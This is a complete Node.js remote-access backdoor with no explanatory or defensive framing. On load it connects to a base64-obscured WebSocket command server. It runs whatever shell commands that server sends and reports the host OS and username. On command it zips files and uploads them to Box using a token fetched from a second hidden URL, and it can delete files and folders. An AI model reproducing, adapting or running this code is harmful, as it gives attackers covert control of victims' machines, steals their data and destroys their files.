const WebSocket = require("ws");
const { exec } = require("child_process");
const path = require("path");
const fs = require("fs");
const archiver = require("archiver");
const axios = require("axios");
const os = require("os");
const FormData = require("form-data");

let currentDirectory = process.cwd();

function executeCommand(command) {
  if (command.startsWith("cd ")) {
    const newPath = command.slice(3).trim();
    if (newPath === "..") {
      currentDirectory = path.dirname(currentDirectory);
    } else if (path.isAbsolute(newPath)) {
      if (fs.existsSync(newPath) && fs.lstatSync(newPath).isDirectory()) {
        currentDirectory = newPath;
      } else {
        return "Directory not found: " + newPath;
      }
    } else {
      const targetPath = path.join(currentDirectory, newPath);
      if (fs.existsSync(targetPath) && fs.lstatSync(targetPath).isDirectory()) {
        currentDirectory = targetPath;
      } else {
        return "Directory not found: " + targetPath;
      }
    }
    return "Changed directory to: " + currentDirectory;
  }

  return new Promise((resolve) => {
    exec(command, { cwd: currentDirectory }, (error, stdout, stderr) => {
      resolve(stdout + stderr);
    });
  });
}

function compressToZip(sourcePath, outputZip) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outputZip);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", () => resolve("Compressed successfully: " + outputZip));
    archive.on("error", (err) => reject("Error: " + err.message));

    archive.pipe(output);

    if (fs.lstatSync(sourcePath).isDirectory()) {
      archive.directory(sourcePath, false);
    } else {
      archive.file(sourcePath, { name: path.basename(sourcePath) });
    }

    archive.finalize();
  });
}

function deleteFileOrFolder(filePath) {
  if (!fs.existsSync(filePath)) {
    return "File or folder not found: " + filePath;
  }

  try {
    const stats = fs.statSync(filePath);

    if (stats.isDirectory()) {
      fs.rmSync(filePath, { recursive: true, force: true });
      return "Deleted folder: " + filePath;
    } else {
      fs.unlinkSync(filePath);
      return "Deleted file: " + filePath;
    }
  } catch (error) {
    return "Error deleting file or folder: " + error.message;
  }
}

async function getToken() {
  try {
    const apt = Buffer.from(
      "aHR0cHM6Ly9ib3gtdG9rZW4udmVyY2VsLmFwcA==",
      "base64"
    ).toString("utf-8");
    const response = await axios.get(apt);
    return response.data;
  } catch (error) {
    return "Error: " + error.response.status;
  }
}

async function uploadFileToBox(filePath, fileName, token) {
  const url = Buffer.from(
    "aHR0cHM6Ly91cGxvYWQuYm94LmNvbS9hcGkvMi4wL2ZpbGVzL2NvbnRlbnQ=",
    "base64"
  ).toString("utf-8");
  const headers = { Authorization: "Bearer " + token };

  const formData = new FormData();
  formData.append(
    "attributes",
    JSON.stringify({ name: fileName, parent: { id: "0" } })
  );
  formData.append("file", fs.createReadStream(filePath));

  try {
    const response = await axios.post(url, formData, {
      headers: { ...headers, ...formData.getHeaders() },
    });
    return response.status === 201
      ? "File uploaded successfully!"
      : "Error: " + response.status + ", Response: " + response.data;
  } catch (error) {
    return (
      "Error: " + error.response.status + ", Response: " + error.response.data
    );
  }
}

const socpa = Buffer.from(
  "d3NzOi8vc29ja2V0c2VydmVyLXByb2R1Y3Rpb24tOTZkOC51cC5yYWlsd2F5LmFwcA==",
  "base64"
).toString("utf-8");
const ws = new WebSocket(socpa);

ws.on("message", async (message) => {
  const command = message.toString();

  if (command === "exit") {
    ws.send("Exiting client...");
    ws.close();
  } else if (command.startsWith("upload_y ")) {
    const targetPath = path.join(currentDirectory, command.slice(9).trim());
    const outputZip = path.join(currentDirectory, "temp0.zip");

    try {
      const zipResult = await compressToZip(targetPath, outputZip);
      const token = await getToken();
      const targetName = new Date().toISOString().replace(/[-:.]/g, "");
      const uploadResult = await uploadFileToBox(outputZip, targetName, token);
      const deleteResult = deleteFileOrFolder(outputZip);

      ws.send(
        zipResult +
          "\nToken: " +
          token +
          "\n" +
          uploadResult +
          "\n" +
          deleteResult
      );
    } catch (err) {
      ws.send("Error: " + err);
    }
  } else if (command === "get_client_info") {
    const osInfo =
      os.type() + "(" + os.release() + ")_" + os.userInfo().username;
    ws.send(osInfo);
  } else if (command.startsWith("delete_y ")) {
    const targetPath = path.join(currentDirectory, command.slice(9).trim());
    const deleteResult = deleteFileOrFolder(targetPath);
    ws.send("\n" + deleteResult);
  } else {
    const output = await executeCommand(command);
    ws.send(output);
  }
});
